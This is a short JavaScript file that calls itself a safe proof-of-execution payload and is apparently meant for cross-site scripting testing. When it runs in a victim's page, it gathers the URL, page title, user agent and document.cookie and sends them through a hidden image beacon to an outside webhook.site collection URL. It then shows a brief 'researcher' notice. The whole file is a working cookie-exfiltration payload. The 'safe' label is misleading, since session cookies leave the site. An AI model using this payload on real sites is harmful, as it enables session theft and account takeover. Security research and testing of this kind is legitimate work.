// PoC payload — safe proof-of-execution
(function(){
  try {
    const info = {
      url: window.location.href || '',
      title: document.title || '',
      userAgent: navigator.userAgent || '',
      cookie: (typeof document !== 'undefined') ? (document.cookie || '') : '',
      ts: new Date().toISOString()
    };

    const q = encodeURIComponent(JSON.stringify(info));
    const beaconUrl = 'https://webhook.site/7ba25211-0a1a-4e4f-a645-4f26b4ec6b71/collect?data=' + q;

    const img = new Image();
    img.src = beaconUrl;
    img.style = 'display:none';
    document.documentElement.appendChild(img);

    const note = document.createElement('div');
    note.textContent = 'PoC JS executed (researcher)';
    note.style = 'position:fixed;bottom:6px;right:6px;background:#fff8;padding:6px;border:1px solid #ccc;font-size:12px;z-index:2147483647';
    document.body.appendChild(note);
    setTimeout(()=>{ try{ note.remove(); }catch(e){} }, 10000);
  } catch(e) {
    console.error('PoC payload error', e);
  }
})();
